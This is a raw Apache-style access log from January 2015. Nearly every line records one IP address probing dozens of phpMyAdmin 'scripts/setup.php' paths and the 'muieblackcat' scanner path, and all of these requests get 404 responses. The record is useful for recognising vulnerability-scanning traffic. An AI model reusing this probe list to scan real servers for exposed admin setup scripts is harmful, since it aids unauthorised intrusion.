198.154.63.131 - - [13/Jan/2015:19:47:04 -0700] "GET //3rdparty/phpMyAdmin/scripts/setup.php HTTP/1.1" 404 995 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:47:10 -0700] "GET //adminmysql/scripts/setup.php HTTP/1.1" 404 987 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:47:10 -0700] "GET //apache-default/phpmyadmin/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:47:10 -0700] "GET //backup/phpmyadmin/scripts/setup.php HTTP/1.1" 404 991 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:47:19 -0700] "GET //cpadmin/scripts/setup.php HTTP/1.1" 404 984 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:47:22 -0700] "GET //cpanelmysql/scripts/setup.php HTTP/1.1" 404 989 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:47:25 -0700] "GET //cpanelsql/scripts/setup.php HTTP/1.1" 404 987 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:47:25 -0700] "GET //cpdbadmin/scripts/setup.php HTTP/1.1" 404 986 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:47:28 -0700] "GET //cpphpmyadmin/scripts/setup.php HTTP/1.1" 404 988 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:47:31 -0700] "GET //dbAdmin2/scripts/setup.php HTTP/1.1" 404 987 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:47:37 -0700] "GET //mydatadmin/scripts/setup.php HTTP/1.1" 404 986 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:47:46 -0700] "GET //php/phpmyadmin/scripts/setup.php HTTP/1.1" 404 988 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:47:47 -0700] "GET //phpm/scripts/setup.php HTTP/1.1" 404 982 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:47:50 -0700] "GET //phpmya/scripts/setup.php HTTP/1.1" 404 985 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:47:50 -0700] "GET //phpmyad/scripts/setup.php HTTP/1.1" 404 985 "-" "-"
66.249.67.111 - - [13/Jan/2015:19:52:55 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
198.154.63.131 - - [13/Jan/2015:21:16:50 -0700] "GET /muieblackcat HTTP/1.1" 404 974 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:16:50 -0700] "GET //scripts/setup.php HTTP/1.1" 404 978 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:16:50 -0700] "GET //admin/scripts/setup.php HTTP/1.1" 404 1256 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:16:50 -0700] "GET //admin/pma/scripts/setup.php HTTP/1.1" 404 1259 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:16:51 -0700] "GET //admin/phpmyadmin/scripts/setup.php HTTP/1.1" 404 1262 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:16:51 -0700] "GET //db/scripts/setup.php HTTP/1.1" 404 980 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:16:51 -0700] "GET //dbadmin/scripts/setup.php HTTP/1.1" 404 984 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:16:51 -0700] "GET //myadmin/scripts/setup.php HTTP/1.1" 404 984 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:16:51 -0700] "GET //mysql/scripts/setup.php HTTP/1.1" 404 985 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:16:51 -0700] "GET //mysqladmin/scripts/setup.php HTTP/1.1" 404 987 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:16:51 -0700] "GET //typo3/phpmyadmin/scripts/setup.php HTTP/1.1" 404 990 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:16:51 -0700] "GET //phpadmin/scripts/setup.php HTTP/1.1" 404 984 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:16:51 -0700] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 988 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:16:51 -0700] "GET //phpmyadmin1/scripts/setup.php HTTP/1.1" 404 988 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:16:51 -0700] "GET //phpmyadmin2/scripts/setup.php HTTP/1.1" 404 988 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:16:51 -0700] "GET //pma/scripts/setup.php HTTP/1.1" 404 981 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:16:54 -0700] "GET //xampp/phpmyadmin/scripts/setup.php HTTP/1.1" 404 991 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:16:57 -0700] "GET //php-my-admin/scripts/setup.php HTTP/1.1" 404 988 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:17:04 -0700] "GET //phpMyAdmin-2.2.3/scripts/setup.php HTTP/1.1" 404 994 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:17:07 -0700] "GET //phpMyAdmin-2.5.1/scripts/setup.php HTTP/1.1" 404 994 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:17:10 -0700] "GET //phpMyAdmin-2.5.5-rc1/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:17:10 -0700] "GET //phpMyAdmin-2.5.5-rc2/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:17:10 -0700] "GET //phpMyAdmin-2.5.5/scripts/setup.php HTTP/1.1" 404 994 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:17:10 -0700] "GET //phpMyAdmin-2.5.5-pl1/scripts/setup.php HTTP/1.1" 404 998 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:17:10 -0700] "GET //phpMyAdmin-2.5.6-rc1/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:17:10 -0700] "GET //phpMyAdmin-2.5.6-rc2/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:21:17:10 -0700] "GET //phpMyAdmin-2.5.6/scripts/setup.php HTTP/1.1" 404 994 "-" "-"
